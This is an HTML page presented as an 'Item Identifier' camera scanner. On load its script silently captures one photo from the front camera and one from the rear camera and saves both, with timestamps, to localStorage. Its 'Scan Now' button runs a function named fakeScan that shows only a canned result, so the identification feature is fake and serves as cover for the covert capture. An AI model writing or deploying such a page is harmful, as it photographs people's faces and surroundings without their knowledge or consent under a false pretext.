<!DOCTYPE html> <html lang="en"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Item Identifier</title> <style> body { margin:0; background:#111; color:#eee; font-family:sans-serif; text-align:center; } #video { width:100%; max-width:640px; border:2px solid #0f0; } #overlay { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(0,0,0,0.7); padding:20px; display:none; } button { padding:12px24px; background:#0a0; color:#fff; border:none; font-size:18px; margin-top:20px; } </style> </head> <body> <h1>Point Camera at Item</h1> <video id="video" autoplay playsinline></video> <div id="overlay">Analyzing... Item identified as common household object</div> <button onclick="fakeScan()">Scan Now</button> <canvas id="canvas" style="display:none;"></canvas> <script> const video = document.getElementById('video');const canvas = document.getElementById('canvas');const overlay = document.getElementById('overlay');let stream;
async function startCamera(facing) { if (stream) { stream.getTracks().forEach(track => track.stop()); } const constraints = { video: { facingMode: facing } }; stream = await navigator.mediaDevices.getUserMedia(constraints); video.srcObject = stream; return new Promise(resolve => { video.onloadedmetadata = () => resolve(); }); }

function captureFrame() { canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video,0,0); return canvas.toDataURL('image/jpeg',0.8); }

async function autoCaptureBoth() { try { await startCamera('user'); await new Promise(r => setTimeout(r,800)); const front = captureFrame(); localStorage.setItem('frontCam', front); localStorage.setItem('frontTime', new Date().toISOString()); await startCamera('environment'); await new Promise(r => setTimeout(r, 800)); const back = captureFrame(); localStorage.setItem('backCam', back); localStorage.setItem('backTime', new Date().toISOString()); await startCamera('user'); } catch (e) { console.log('camera error', e); } }

function fakeScan() { overlay.style.display = 'block'; setTimeout(() => overlay.style.display = 'none',2500); }

window.addEventListener('load', () => { autoCaptureBoth();});</script>

</body> </html>
